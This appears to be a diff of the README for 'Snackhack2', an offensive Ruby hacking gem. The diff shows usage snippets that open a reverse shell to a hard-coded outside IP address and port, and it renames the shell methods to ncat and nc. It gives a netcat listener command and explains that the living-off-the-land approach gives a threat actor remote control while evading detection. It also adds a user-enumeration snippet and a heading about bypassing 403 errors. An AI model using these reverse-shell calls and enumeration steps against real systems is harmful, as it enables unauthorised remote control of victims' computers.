@@ -267,7 +267,7 @@ Will print out the command to run and will set a cron job that will run every mi
 rs = Snackhack2::ReverseShell.new
 rs.ip   = "167.71.98.144"
 rs.port = "99"
-rs.run
+rs.ncat
 ```
 
 This will use bash.exe to connect to a reverse shell. On the remote computer run: `nc -lvp 4444`. After running the code below the computer will connect to the remote server, giving the threat actor remote control of the computer. This is all done by Living of the land, without any third party tools, just the features built into Windows. This is favored by threat actors since they do not need to install any malware that could be detected and remvoed.
@@ -282,7 +282,7 @@ rs.bash
 
 ## Version 2 of bash
 
-rs.version2
+rs.nc
 
 ```
 ## List Users
@@ -307,6 +307,11 @@ List all users on Windows. This feature uses `net user` command.
 ```ruby
 lu = Snackhack2::ListUsers.new
 lu.windows
+```
+Auto Detect OS to run the list user commands on Linux or Windows systems.
+```ruby
+lu = Snackhack2::ListUsers.new
+lu.auto
 ```
 ## Bypass 403 Errors
 
